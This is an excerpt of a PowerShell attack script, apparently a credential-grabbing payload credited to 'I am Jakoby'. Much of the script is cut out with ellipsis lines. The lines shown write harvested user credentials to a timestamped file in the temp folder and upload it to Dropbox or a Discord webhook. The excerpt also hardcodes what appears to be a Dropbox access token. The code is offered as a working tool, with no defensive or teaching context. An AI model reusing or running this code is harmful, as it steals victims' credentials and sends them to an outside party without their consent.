###Combo ADV Recon and GetCreds by I am Jakoby###
...
$CredsFileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
...
echo $creds >> $env:TMP\$CredsFileName
...
if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$CredsFileName}
...
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$CredsFileName}
...
$db = "sl.BaOujEK_khq5NDi6ohwd9s8q-2vzCklXbzwB46-fmO4tUYGpG_xWctmoa8pFFwqevaMcizdgck470K5GkwQm-t6E81sqr5WhgoHoJ8uQxIxiwrt0mIzw4YwelWdmBGO-luMgTQl0"
